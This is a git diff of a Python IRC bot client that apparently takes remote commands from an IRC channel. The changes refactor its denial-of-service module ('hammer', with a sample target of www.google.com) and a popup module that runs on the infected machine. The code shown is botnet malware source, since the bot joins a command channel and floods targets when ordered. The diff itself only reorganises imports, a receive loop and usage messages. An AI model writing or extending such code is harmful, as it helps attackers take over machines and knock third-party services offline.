@@ -9,8 +9,7 @@ __version__ = "v0.0.1"
 __date__    = "20.06.2017"
 __mail__    = "blackvkng@yandex.com"
 
-import os
-import sys
+import time
 import random
 import socket
 import getpass
@@ -41,12 +40,6 @@ def login():
 	send("USER " + ' '.join([NICK for i in range(4)]))
 	send("NICK " + NICK)
 	send("JOIN " + CHNL)
-
-def recv():
-	''' Receive data from IRC channel / user '''
-
-	while True:
-		msg = IRC.recv(4096)
 
 def startDos(url):
 	''' Start dos module(hammer) in new thread '''
@@ -85,21 +78,17 @@ def run(msg, priv=False):
 			else:
 				pass
 					
-		else:
-			usage  = "[?] Dos module usage: dos set target www.google.com"
-			usage2 = "[?] Dos module usage: dos start"
-			
-			for i in [usage, usage2]:
+		else:			
+			for i in hammer.usage:
 				send("PRIVMSG %s :%s"%(receiver, i))
+				time.sleep(1)
 
 	elif message[0] == "popup":
 		if len(message) > 1:
 			content = ' '.join(message[1:])
 			popupMessage(content)
 		else:
-			usage = "[?] Popup module usage: popup TEXT"
-			send("PRIVMSG %s :%s"%(receiver, usage))
-		
+			send("PRIVMSG %s :%s"%(receiver, popup.usage))		
 
 	else:
 		pass
